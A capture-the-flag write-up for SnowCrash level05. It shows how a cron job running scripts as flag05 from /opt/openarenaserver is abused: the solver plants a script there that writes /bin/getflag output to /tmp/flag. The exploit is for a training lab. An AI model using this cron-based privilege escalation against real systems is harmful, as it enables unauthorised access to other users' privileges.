When logging into level05 you get this:

level05@SnowCrash's password:
You have new mail.
level05@SnowCrash:~$

"You have new mail" 

https://superuser.com/questions/395922/postfix-mail-storage-files

Emails are stored into /var/mail on Linux systems.

~$ ls /var/mail
level05
~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

This is a cron that runs every 2 minutes, executing the command as the user flag05
It just execute this script /usr/sbin/openarenaserver every two minutes
Let's see what's this script does

```
~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

Overall, this script will execute all scripts present
in the /opt/openarenaserver directory, with a time limit to prevent
any single script from consuming too many resources or running
for too long thanks to ulimit.

As we saw the script is runned as the flag05 user so the exploit is pretty obvious
We could just create a script that will run getflag and store the result in a file,
then wait for the cron to execute the /usr/sbin/openarenaserver script.

Solution:

- Create the script and place it in /opt/openarenaserver directory

~$ touch /opt/openarenaserver/exploit.sh
~$ echo "/bin/getflag > /tmp/flag" > /opt/openarenaserver/exploit.sh

- Wait for the cron to execute the /usr/sbin/openarenaserver script (every 2 minutes)
- It should delete the exploit.sh
- Then cat the result that we stored in /tmp/flag

~$ cat /tmp/flag
